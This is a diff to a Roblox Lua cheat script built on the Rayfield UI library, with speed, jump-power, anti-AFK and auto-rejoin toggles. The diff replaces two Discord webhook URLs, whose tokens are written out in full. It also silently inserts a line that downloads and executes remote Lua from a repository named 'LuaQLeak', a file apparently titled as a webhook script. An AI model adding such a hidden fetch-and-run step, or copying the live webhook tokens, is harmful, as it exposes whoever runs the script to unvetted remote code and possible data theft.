@@ -1,12 +1,9 @@
-
-
-
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local Player = game:GetService("Players").LocalPlayer or game:GetService("Players").PlayerAdded:Wait()
 local VCurrentVersion
 
-local GlobalWebhookUnsplit = "https://discord.com/api/webhooks/1060185342164086814/wyq8lxr73UjHZmgCswKX65FCA6t9y5CMRINj_20UOepimMgmgw8QGDBAFg4qwhY29JQG"
-local SuggestionsWebhookUnsplit = "https://discord.com/api/webhooks/1061587732012478516/FXQtOHlg7zbdN2bdsw5xz60cYLzEFS8jhHMKO8XYuNArE0zEjcsOMbKlmnBfgbTU6Twa"
+local GlobalWebhookUnsplit = "https://discord.com/api/webhooks/1062144063794589726/bC_ftzBkot6xkTAP5hcuyBMMp8V80Wlk5WVO3hjrwI88NUsSIygNAdX5yGDAS6EVYFR8"
+local SuggestionsWebhookUnsplit = "https://discord.com/api/webhooks/1062143916108955720/QFAx9740MUGFOUSe8ipBi1gyALEtDJwvgLn_CFyNLOZ_uhwzOh_l0SunG7ckh3ghC48n"
 
 local GlobalWebhookParts = GlobalWebhookUnsplit:split("{")
 local SuggestionsWebhookParts = SuggestionsWebhookUnsplit:split("{")
@@ -44,9 +41,11 @@ function SendMessage(Message, Botname)
 
 	return Data or nil;
 end
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+
 
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
-
 
 task.spawn(function()
 	pcall(function()
@@ -100,11 +99,9 @@ local function CreateWindow()
 		}
 	})
 
-	repeat task.wait() until Window
-
 	task.defer(function()
 		task.wait(1.5)
-		local Universal = Window:CreateTab("Universal", 4483362458)
+		local Universal = Window:CreateTab("Universal")
 
 		Universal:CreateToggle({
 			Name = "🚫 Anti-AFK",
@@ -121,7 +118,7 @@ local function CreateWindow()
 			end,
 		})
 
-		local AutoRejoin = Universal:CreateToggle({
+		Universal:CreateToggle({
 			Name = "🔁 Auto Rejoin",
 			CurrentValue = false,
 			Flag = "Universal-AutoRejoin",
@@ -157,10 +154,10 @@ local function CreateWindow()
 				end
 			end,
 		})
-
+		
 		Rayfield:LoadConfiguration()
 
-		Universal:CreateSection("Modifiers")
+		Universal:CreateSection("")
 
 
 		local WalkSpeed = 0
@@ -265,7 +262,6 @@ Toggle = Universal:CreateToggle({
 		end
 	end,
 })
-
 
 
 		Universal:CreateSection("Safety")
@@ -429,6 +425,9 @@ game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("JumpPower"
     if not getgenv().LoopJumpPower then return end
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
 end)
+
+
+
 
 
 
@@ -622,4 +621,3 @@ Rayfield:LoadConfiguration()
 end
 
 return Player, Rayfield, Click, comma, Notify, CreateWindow
-
